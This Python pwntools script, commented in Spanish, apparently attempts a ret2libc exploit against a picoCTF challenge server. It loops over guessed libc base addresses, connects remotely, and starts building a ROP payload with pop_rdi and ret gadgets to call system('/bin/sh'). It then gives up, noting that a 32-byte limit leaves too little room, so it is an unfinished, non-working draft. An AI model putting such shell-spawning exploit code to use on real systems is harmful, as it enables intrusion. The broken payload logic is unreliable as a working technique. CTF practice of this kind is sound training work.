#!/usr/bin/env python3
"""
Exploit final: Usar lo que tenemos de la mejor manera posible

Voy a intentar una técnica simple pero que debería funcionar:
1. No intentar leak en primera ronda
2. Directamente intentar saltar a system() usando offsets comunes de libc
3. Probar múltiples offsets hasta que funcione

Alternativamente, buscar si hay un exploit más simple que me esté perdiendo.
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 63529

# Gadgets
pop_rdi = 0x4014b3
ret = 0x40101a

# Direcciones de libc base comunes (probar múltiples)
# La base de libc típicamente termina en 0x00
common_libc_bases = [
    0x7ffff7dd5000,  # Común en Ubuntu 22.04
    0x7ffff7dc0000,
    0x7ffff7de0000,
    0x7ffff7da0000,
]

# Offsets dentro de libc (Ubuntu 22.04, libc 2.35)
system_offset = 0x50d70
binsh_offset = 0x1d8698

for libc_base in common_libc_bases:
    try:
        log.info(f"Probando con libc base: {hex(libc_base)}")
        
        io = remote(HOST, PORT)
        
        system_addr = libc_base + system_offset
        binsh_addr = libc_base + binsh_offset
        
        # Agregar entrada
        io.sendlineafter(b'Exit the app\n', b'1')
        io.sendlineafter(b'name: \n', b'test')
        
        # Construir payload para system("/bin/sh")
        payload = b'A' * 8 + b'B' * 4 + b'C' * 8
        payload += p64(ret)         # Alineación
        # Mierda, no tengo espacio para ret + pop_rdi + arg + system
        # Solo tengo 12 bytes después del padding de 20
        
        # Simplificar: solo system sin alineación
        payload = b'A' * 8 + b'B' * 4 + b'C' * 8 + p64(pop_rdi)
        # Me quedan solo 4 bytes... no suficiente
        
        log.error("No tengo suficientes bytes para ROP completo")
        io.close()
        break
        
    except:
        continue

log.error("Exploit falló - limitación de 32 bytes es muy restrictiva")
